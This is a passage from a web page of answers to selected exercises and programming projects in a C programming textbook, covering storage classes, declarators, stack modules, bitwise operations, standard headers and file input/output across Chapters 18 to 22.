number)</span><br><span class="line">      return i;</span><br><span class="line">  return -1;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * insert: Prompts the user for information about a new   *</span><br><span class="line"> *         part and then inserts the part into the        *</span><br><span class="line"> *         database. Prints an error message and returns  *</span><br><span class="line"> *         prematurely if the part already exists or the  *</span><br><span class="line"> *         database is full.                              *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void insert(void)</span><br><span class="line">{</span><br><span class="line">  int part_number;</span><br><span class="line"> </span><br><span class="line">  if (num_parts == MAX_PARTS) {</span><br><span class="line">    printf("Database is full; can't add more parts.\n");</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;part_number);</span><br><span class="line">  if (find_part(part_number) &gt;= 0) {</span><br><span class="line">    printf("Part already exists.\n");</span><br><span class="line">    return;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  inventory[num_parts].number = part_number;</span><br><span class="line">  printf("Enter part name: ");</span><br><span class="line">  read_line(inventory[num_parts].name, NAME_LEN);</span><br><span class="line">  printf("Enter quantity on hand: ");</span><br><span class="line">  scanf("%d", &amp;inventory[num_parts].on_hand);</span><br><span class="line">  num_parts++;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * search: Prompts the user to enter a part number, then  *</span><br><span class="line"> *         looks up the part in the database. If the part *</span><br><span class="line"> *         exists, prints the name and quantity on hand;  *</span><br><span class="line"> *         if not, prints an error message.               *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void search(void)</span><br><span class="line">{</span><br><span class="line">  int i, number;</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;number);</span><br><span class="line">  i = find_part(number);</span><br><span class="line">  if (i &gt;= 0) {</span><br><span class="line">    printf("Part name: %s\n", inventory[i].name);</span><br><span class="line">    printf("Quantity on hand: %d\n", inventory[i].on_hand);</span><br><span class="line">  } else</span><br><span class="line">    printf("Part not found.\n");</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * update: Prompts the user to enter a part number.       *</span><br><span class="line"> *         Prints an error message if the part doesn't    *</span><br><span class="line"> *         exist; otherwise, prompts the user to enter    *</span><br><span class="line"> *         change in quantity on hand and updates the     *</span><br><span class="line"> *         database.                                      *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void update(void)</span><br><span class="line">{</span><br><span class="line">  int i, number, change;</span><br><span class="line"> </span><br><span class="line">  printf("Enter part number: ");</span><br><span class="line">  scanf("%d", &amp;number);</span><br><span class="line">  i = find_part(number);</span><br><span class="line">  if (i &gt;= 0) {</span><br><span class="line">    printf("Enter change in quantity on hand: ");</span><br><span class="line">    scanf("%d", &amp;change);</span><br><span class="line">    inventory[i].on_hand += change;</span><br><span class="line">  } else</span><br><span class="line">    printf("Part not found.\n");</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">/**********************************************************</span><br><span class="line"> * print: Sorts the inventory array by part number, then  *</span><br><span class="line"> *        prints a listing of all parts in the database,  *</span><br><span class="line"> *        showing the part number, part name, and         *</span><br><span class="line"> *        quantity on hand.                               *</span><br><span class="line"> **********************************************************/</span><br><span class="line">void print(void)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  qsort(inventory, num_parts, sizeof(struct part), compare_parts);</span><br><span class="line">  printf("Part Number   Part Name                  "</span><br><span class="line">         "Quantity on Hand\n");</span><br><span class="line">  for (i = 0; i &lt; num_parts; i++)</span><br><span class="line">    printf("%7d       %-25s%11d\n", inventory[i].number,</span><br><span class="line">           inventory[i].name, inventory[i].on_hand);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">int compare_parts(const void *p, const void *q)</span><br><span class="line">{</span><br><span class="line">  return ((struct part *) p)-&gt;number - ((struct part *) q)-&gt;number;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-18"><a href="#Chapter-18" class="headerlink" title="Chapter 18"></a>Chapter 18</h3><h4 id="Answers-to-Selected-Exercises-13"><a href="#Answers-to-Selected-Exercises-13" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] </p><p>(a) <code>extern</code><br> (b) <code>static</code><br> (c) <code>extern</code> and <code>static</code> (when applied to a local variable) </p><p><strong>4.</strong> [was #4] If <code>f</code> has never been called previously, the value of <code>f(10)</code> will be 0. If <code>f</code> has been called five times previously, the value of <code>f(10)</code> will be 50, since <code>j</code> is incremented once per call. </p><p><strong>8.</strong> [was #6; modified] </p><p>(a) <code>x</code> is an array of ten pointers to functions. Each function takes an <code>int</code> argument and returns a character.<br> (b) <code>x</code> is a function that returns a pointer to an array of five integers.<br> (c) <code>x</code> is a function with no arguments that returns a pointer to a function with an <code>int</code> argument that returns a pointer to a <code>float</code> value.<br> (d) <code>x</code> is a function with two arguments. The first argument is an integer, and the second is a pointer to a function with an <code>int</code> argument and no return value. <code>x</code> returns a pointer to a function with an <code>int</code> argument and no return value. (Although this example may seem artificially complex, the <code>signal</code> function—part of the standard C library—has exactly this prototype. See p. 632 for a discussion of <code>signal</code>.)</p><p><strong>10.</strong> [was #8] </p><p>(a) <code>char *(*p)(char *);</code><br> (b) <code>void *f(struct t *p, long int n)(void);</code><br> (c) <code>void (*a[])(void) = {insert, search, update, print};</code><br> (d) <code>struct t (*b[10])(int, int);</code> </p><p><strong>13.</strong> [was #10] (a), (c), and (d) are legal. (b) is illegal; the initializer for a variable with static storage duration must be a constant expression, and <code>i</code> <code>*</code> <code>i</code> doesn’t qualify. </p><p><strong>15.</strong> [was #12] (a). Variables with static storage duration are initialized to zero by default; variables with automatic storage duration have no default initial value. </p><h3 id="Chapter-19"><a href="#Chapter-19" class="headerlink" title="Chapter 19"></a>Chapter 19</h3><h4 id="Answers-to-Selected-Exercises-14"><a href="#Answers-to-Selected-Exercises-14" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include "stack.h"</span><br><span class="line"> </span><br><span class="line">#define PUBLIC  /* empty */</span><br><span class="line">#define PRIVATE static</span><br><span class="line"> </span><br><span class="line">struct node {</span><br><span class="line">  int data;</span><br><span class="line">  struct node *next;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">PRIVATE struct node *top = NULL;</span><br><span class="line"> </span><br><span class="line">PRIVATE void terminate(const char *message)</span><br><span class="line">{</span><br><span class="line">  printf("%s\n", message);</span><br><span class="line">  exit(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">PUBLIC void make_empty(void)</span><br><span class="line">{</span><br><span class="line">  while (!is_empty())</span><br><span class="line">    pop();</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">PUBLIC bool is_empty(void)</span><br><span class="line">{</span><br><span class="line">  return top == NULL;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">PUBLIC bool is_full(void)</span><br><span class="line">{</span><br><span class="line">  return false;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">PUBLIC void push(int i)</span><br><span class="line">{</span><br><span class="line">  struct node *new_node = malloc(sizeof(struct node));</span><br><span class="line">  if (new_node == NULL)</span><br><span class="line">    terminate("Error in push: stack is full.");</span><br><span class="line"> </span><br><span class="line">  new_node-&gt;data = i;</span><br><span class="line">  new_node-&gt;next = top;</span><br><span class="line">  top = new_node;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">PUBLIC int pop(void)</span><br><span class="line">{</span><br><span class="line">  struct node *old_top;</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  if (is_empty())</span><br><span class="line">    terminate("Error in pop: stack is empty.");</span><br><span class="line"> </span><br><span class="line">  old_top = top;</span><br><span class="line">  i = top-&gt;data;</span><br><span class="line">  top = top-&gt;next;</span><br><span class="line">  free(old_top);</span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #4; modified] </p><p>(a) Contents of <code>stack.c</code> file: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include "stack.h"</span><br><span class="line"> </span><br><span class="line">static void terminate(const char *message)</span><br><span class="line">{</span><br><span class="line">  printf("%s\n", message);</span><br><span class="line">  exit(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">void make_empty(Stack *s)</span><br><span class="line">{</span><br><span class="line">  s-&gt;top = 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_empty(const Stack *s)</span><br><span class="line">{</span><br><span class="line">  return s-&gt;top == 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_full(const Stack *s)</span><br><span class="line">{</span><br><span class="line">  return s-&gt;top == STACK_SIZE;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">void push(Stack *s, int i)</span><br><span class="line">{</span><br><span class="line">  if (is_full(s))</span><br><span class="line">    terminate("Error in push: stack is full.");</span><br><span class="line">  s-&gt;contents[s-&gt;top++] = i;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">int pop(Stack *s)</span><br><span class="line">{</span><br><span class="line">  if (is_empty(s))</span><br><span class="line">    terminate("Error in pop: stack is empty.");</span><br><span class="line">  return s-&gt;contents[--s-&gt;top];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) Contents of <code>stack.h</code> file: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#ifndef STACK_H</span><br><span class="line">#define STACK_H</span><br><span class="line"> </span><br><span class="line">#include &lt;stdbool.h&gt;   /* C99 only */</span><br><span class="line"> </span><br><span class="line">struct node {</span><br><span class="line">  int data;</span><br><span class="line">  struct node *next;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">typedef struct node *Stack;</span><br><span class="line"> </span><br><span class="line">void make_empty(Stack *s);</span><br><span class="line">bool is_empty(const Stack *s);</span><br><span class="line">bool is_full(const Stack *s);</span><br><span class="line">void push(Stack *s, int i);</span><br><span class="line">int pop(Stack *s);</span><br><span class="line"> </span><br><span class="line">#endif</span><br></pre></td></tr></tbody></table></figure><p>Contents of <code>stack.c</code> file: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include "stack.h"</span><br><span class="line"> </span><br><span class="line">static void terminate(const char *message)</span><br><span class="line">{</span><br><span class="line">  printf("%s\n", message);</span><br><span class="line">  exit(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">void make_empty(Stack *s)</span><br><span class="line">{</span><br><span class="line">  while (!is_empty(s))</span><br><span class="line">    pop(s);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_empty(const Stack *s)</span><br><span class="line">{</span><br><span class="line">  return *s == NULL;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">bool is_full(const Stack *s)</span><br><span class="line">{</span><br><span class="line">  return false;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">void push(Stack *s, int i)</span><br><span class="line">{</span><br><span class="line">  struct node *new_node = malloc(sizeof(struct node));</span><br><span class="line">  if (new_node == NULL)</span><br><span class="line">    terminate("Error in push: stack is full.");</span><br><span class="line"> </span><br><span class="line">  new_node-&gt;data = i;</span><br><span class="line">  new_node-&gt;next = *s;</span><br><span class="line">  *s = new_node;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">int pop(Stack *s)</span><br><span class="line">{</span><br><span class="line">  struct node *old_top;</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  if (is_empty(s))</span><br><span class="line">    terminate("Error in pop: stack is empty.");</span><br><span class="line"> </span><br><span class="line">  old_top = *s;</span><br><span class="line">  i = (*s)-&gt;data;</span><br><span class="line">  *s = (*s)-&gt;next;</span><br><span class="line">  free(old_top);</span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-20"><a href="#Chapter-20" class="headerlink" title="Chapter 20"></a>Chapter 20</h3><h4 id="Answers-to-Selected-Exercises-15"><a href="#Answers-to-Selected-Exercises-15" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] To toggle a bit in a variable <code>i</code>, apply the exclusive-or operator (<code>^</code>) to <code>i</code> and a mask with a 1 bit in the desired position, then store the result back into <code>i</code>. To toggle bit 4, for example, use the statement </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = i ^ 0x0010;</span><br></pre></td></tr></tbody></table></figure><p>or, more concisely, </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i ^= 0x0010;</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #4] ``</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MK_COLOR(r,g,b) ((long) (b) &lt;&lt; 16 | (g) &lt;&lt; 8 | (r))</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #6; modified] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">unsigned short swap_bytes(unsigned short i);</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  unsigned short i;</span><br><span class="line"> </span><br><span class="line">  printf("Enter a hexadecimal number (up to four digits): ");</span><br><span class="line">  scanf("%hx", &amp;i);</span><br><span class="line">  printf("Number with bytes swapped: %hx\n", swap_bytes(i));</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">unsigned short swap_bytes(unsigned short i)</span><br><span class="line">{</span><br><span class="line">  unsigned short high_byte = i &lt;&lt; 8;</span><br><span class="line">  unsigned short low_byte = i &gt;&gt; 8;</span><br><span class="line"> </span><br><span class="line">  return high_byte | low_byte;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsigned short swap_bytes(unsigned short i)</span><br><span class="line">{</span><br><span class="line">  return i &lt;&lt; 8 | i &gt;&gt; 8;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>8.</strong> [was #8] </p><p>(a) The value of <code>~0</code> is a number containing all 1 bits. Shifting this number to the left by <code>n</code> places yields a result of the form 1…10…0, where there are <code>n</code> 0 bits. Applying the <code>~</code> operator to that number yields a result of the form 0…01…1, where there are <code>n</code> 1 bits. </p><p>(b) It returns a bit-field within <code>i</code> of length <code>n</code> starting at position <code>m</code>. Positions are assumed to be numbered starting from the rightmost bit, which is position 0. </p><p><strong>14.</strong> [was #9] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct IEEE_float {</span><br><span class="line">  unsigned int fraction: 23;   /* members may need to be reversed */</span><br><span class="line">  unsigned int exponent: 8;</span><br><span class="line">  unsigned int sign: 1;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-21"><a href="#Chapter-21" class="headerlink" title="Chapter 21"></a>Chapter 21</h3><h4 id="Answers-to-Selected-Exercises-16"><a href="#Answers-to-Selected-Exercises-16" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>7.</strong> [was #4] </p><p>(a) <code>&lt;time.h&gt;</code><br> (b) <code>&lt;ctype.h&gt;</code><br> (c) <code>&lt;limits.h&gt;</code><br> (d) <code>&lt;math.h&gt;</code><br> (e) <code>&lt;limits.h&gt;</code><br> (f) <code>&lt;float.h&gt;</code><br> (g) <code>&lt;string.h&gt;</code><br> (h) <code>&lt;stdio.h&gt;</code> </p><h3 id="Chapter-22"><a href="#Chapter-22" class="headerlink" title="Chapter 22"></a>Chapter 22</h3><h4 id="Answers-to-Selected-Exercises-17"><a href="#Answers-to-Selected-Exercises-17" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] </p><p>(a) <code>"rb+"</code><br> (b) <code>"a"</code><br> (c) <code>"rb"</code><br> (d) <code>"r"</code> </p><p><strong>4.</strong> [was #4] </p><p>(a) <code>00000083.736</code><br> (b) <code>00000029749.</code><br> (c) <code>001.0549e+09</code><br> (d) <code>002.3522e-05</code> </p><p><strong>6.</strong> [was #6] <code>printf(widget == 1 ? "%d widget" : "%d widgets", widget);</code> </p><p><strong>8.</strong> [was #8] No. The difference is that <code>"%1s"</code> will store a null character after it reads and stores a nonblank character; <code>" %c"</code> will store only the nonblank character. As a result, the two format strings must be used differently: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char c, s[2];</span><br><span class="line"> </span><br><span class="line">scanf(" %c", &amp;c);  /* stores a nonblank character into c */</span><br><span class="line">scanf("%1s", s);   /* stores a nonblank character into s[0]</span><br><span class="line">                      and a null character into s[1] */</span><br><span class="line"> </span><br></pre></td></tr></tbody></table></figure><p><strong>10.</strong> [was #10] Revise the program’s <code>while</code> loop as follows: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while ((ch = getc(source_fp)) != EOF)</span><br><span class="line">  if (putc(ch, dest_fp) == EOF) {</span><br><span class="line">    fprintf(stderr, "Error during writing; copy terminated\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p><strong>14.</strong> [was #18] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">char *fget_string(char *s, int n, FILE *stream)</span><br><span class="line">{</span><br><span class="line">  int ch, len = 0;</span><br><span class="line"> </span><br><span class="line">  while (len &lt; n - 1) {</span><br><span class="line">    if ((ch = getc(stream)) == EOF) {</span><br><span class="line">      if (len == 0 || ferror(stream))</span><br><span class="line">        return NULL;</span><br><span class="line">      break;</span><br><span class="line">    }</span><br><span class="line">    s[len++] = ch;</span><br><span class="line">    if (ch == '\n')</span><br><span class="line">      break;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  s[len] = '\0';</span><br><span class="line">  return s;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int fput_string(const char *s, FILE *stream)</span><br><span class="line">{</span><br><span class="line">  while (*s != '\0') {</span><br><span class="line">    if (putc(*s, stream) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">    s++;</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>15.</strong> [was #22] </p><p>(a) <code>fseek(fp, n * 64L, SEEK_SET);</code><br> (b) <code>fseek(fp, -64L, SEEK_END);</code><br> (c) <code>fseek(fp, 64L, SEEK_CUR);</code><br> (d) <code>fseek(fp, -128L, SEEK_CUR);</code> </p><h4 id="Answers-to-Selected-Programming-Projects-9"><a href="#Answers-to-Selected-Programming-Projects-9" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>2.</strong> [was #12] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  FILE *fp;</span><br><span class="line">  int ch;</span><br><span class="line"> </span><br><span class="line">  if (argc != 2) {</span><br><span class="line">    fprintf(stderr, "usage: toupper file\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((fp = fopen(argv[1], "r")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[1]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  while ((ch = getc(fp)) != EOF)</span><br><span class="line">    putchar(toupper(ch));</span><br><span class="line"> </span><br><span class="line">  fclose(fp);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #14] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  FILE *fp;</span><br><span class="line">  int count = 0;</span><br><span class="line"> </span><br><span class="line">  if (argc != 2) {</span><br><span class="line">    fprintf(stderr, "usage: cntchar file\n");</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  if ((fp = fopen(argv[1], "r")) == NULL) {</span><br><span class="line">    fprintf(stderr, "Can't open %s\n", argv[1]);</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  while (getc(fp) != EOF)</span><br><span class="line">    count++;</span><br><span class="line"> </span><br><span class="line">  printf("There are %d characters in %s\n", count, argv[1]);</span><br><span class="line"> </span><br><span class="line">  fclose(fp);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;   /* C99 